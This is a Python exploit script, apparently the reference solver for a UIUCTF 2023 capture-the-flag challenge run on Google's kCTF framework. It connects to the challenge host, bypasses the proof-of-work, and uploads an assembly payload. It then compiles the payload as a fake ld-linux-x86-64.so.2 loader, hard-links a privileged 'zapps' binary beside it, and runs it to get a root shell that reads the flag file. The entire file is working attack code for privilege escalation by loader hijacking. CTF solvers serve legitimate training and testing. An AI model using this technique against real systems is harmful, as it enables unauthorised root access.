#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import sys
import pwnlib.tubes

rprint = sys.stdout.buffer.write


def handle_pow(r):
    rprint(r.recvuntil(b'python3 '))
    rprint(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    rprint(r.recvuntil(b'Correct\n'))


r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
rprint(r.recvuntil(b'== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

rprint(r.recvuntil(b'uiuctf-2023:~$ '))
r.sendline(b"cat > payload.S << 'EOF'")
with open('/home/user/payload.S', 'rb') as f:
    r.send(f.read())
r.sendline(b'EOF')

rprint(r.recvuntil(b'uiuctf-2023:~$ '))
r.sendline(b'gcc -o ld-linux-x86-64.so.2 -static-pie -nostartfiles -Wl,--gc-sections payload.S')

rprint(r.recvuntil(b'uiuctf-2023:~$ '))
r.sendline(b'ln zapps/build/exe exe')

rprint(r.recvuntil(b'uiuctf-2023:~$ '))
r.sendline(b'./exe')

rprint(r.recvuntil(b'/home/user #'))
r.sendline(b'cat /mnt/flag')

rprint(r.recvuntil((b'CTF{', b'uiuctf{')))
rprint(r.recvuntil((b'}')))

exit(0)
